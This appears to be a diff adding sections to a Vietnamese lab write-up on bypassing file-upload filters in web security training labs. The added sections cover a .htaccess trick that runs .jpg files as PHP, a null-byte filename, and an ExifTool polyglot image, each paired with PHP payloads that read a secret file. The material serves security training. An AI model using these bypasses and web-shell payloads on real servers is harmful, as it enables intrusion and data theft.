@@ -42,4 +42,55 @@ Truy cập `/files/payload.php`, ta thấy đoạn code được execute và tr�
 
 ![image](https://user-images.githubusercontent.com/103978452/202961174-fed4b7c5-a005-4096-b909-b56917ff110d.png)
 
-# 4.
+# 4. Web shell upload via extension blacklist bypass
+Ta thấy server đã chặn các file có đuôi .php. Thử sử dụng các kỹ thuật để obfuscate file extension, kết quả không thành công
+
+Ta thử bypass bằng cách upload file `.htaccess` với nội dung:
+```
+AddType application/x-httpd-php .jpg
+```
+File này sẽ cấu hình server cho phép chạy các file có đuôi .jpg như một file php
+
+![image](https://user-images.githubusercontent.com/103978452/203673325-04ed4e21-1fcb-466d-b8a7-13d0386969ac.png)
+
+Kết quả upload file thành công. Ta tiếp tục upload file `payload.jpg` với nội dung:
+```
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+Sau đó truy cập `/files/avatars/payload.jpg`, kết quả thu được nội dung file cần tìm.
+
+![image](https://user-images.githubusercontent.com/103978452/203673682-3cca7ead-61ec-48b3-954c-9212adc7ea37.png)
+
+# 5. Web shell upload via obfuscated file extension
+Ta upload file `payload.php` với nội dung:
+```
+<?php echo file_get_contents('/home/carlos/secret'); ?>
+```
+thì server trả về thông báo lỗi: "Sorry, only JPG & PNG files are allowed"
+
+Ta thay đổi filename thành `payload.php%00.jpg` rồi submit, kết quả thành công.
+
+Truy cập `/files/avatars/payload.php` thu được nội dung file cần tìm
+
+![image](https://user-images.githubusercontent.com/103978452/203674340-7274dfef-a47e-4a9d-82c6-3e832485c6c6.png)
+
+# 6. Remote code execution via polyglot web shell upload
+Ta upload file `payload.php` thì thấy server trả về `Error: file is not a valid image`.
+
+Dùng ExifTool để chèn một đoạn php vào trong file image `naruto.jpg` với lệnh:
+```
+exiftool -DocumentName="<h1>HELLO</h1><?php echo file_get_contents('/home/carlos/secret'); ?>" naruto.jpg
+```
+Sau đó đổi tên file thành `naruto.php` và upload lên website. Kết quả trả về thành công. Dùng BurpSuite để bắt request, ta thấy trong nội dung file có chứa đoạn code đã được inject
+
+![image](https://user-images.githubusercontent.com/103978452/203678647-73fc07b3-f7f7-43df-99c5-e64a5bbbf57d.png)
+
+Thử truy cập `/files/avatars/naruto.php` thì server trả về lỗi `500 Internal Server Error`. Như vậy có khả năng trong phần thân image có các kí tự đặc biệt như `<?` khiến cho đoạn code bị lỗi. Ta dùng lệnh `__halt_compiler() ?>` để các đoạn code bên dưới không được execute. Như vậy injected code sẽ là:
+```
+<h1>HELLO</h1><?php echo file_get_contents('/home/carlos/secret'); __halt_compiler(); ?>
+```
+Sau khi upload, truy cập `/files.avatars/naruto.php`, kết quả trả về nội dung file mong muốn.
+
+![image](https://user-images.githubusercontent.com/103978452/203678976-af5de655-ed73-404e-a818-fb4515bea3ca.png)
+
+# 6. Web shell upload via race condition
